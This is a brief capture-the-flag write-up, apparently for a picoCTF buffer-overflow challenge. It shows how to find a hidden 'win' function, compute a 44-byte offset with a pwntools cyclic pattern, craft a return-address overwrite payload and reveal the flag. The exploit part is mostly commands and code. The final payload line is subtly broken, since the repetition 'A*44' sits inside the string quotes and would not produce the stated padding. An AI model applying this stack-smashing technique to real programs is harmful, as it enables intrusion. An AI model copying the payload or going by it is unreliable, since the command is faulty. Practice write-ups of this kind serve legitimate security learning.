## Task Description
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/252/vuln).You can view source [here](https://artifacts.picoctf.net/c/252/vuln.c). And connect with it using `nc saturn.picoctf.net 54900`

## Notes
quick file checks shows that it is a ELF 32 bit.
Looking in gdb-pwndbg there is an intresting function called win. This function is not called normally so it must be the flag?

Generate a cyclic pattern in python
```python
from pwn import *
g = cyclic_gen()
g.get(100)
```

Running the program with the payload gives a seg fault.
calculating the offset to be: 44

All that is left to get is the location of the win function.
0x80491f6
Generate payload
```bash
python2 -c 'print "A*44"+"\xf6\x91\x04\x08"'>payload
```
then run against the server.
```flag
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
```
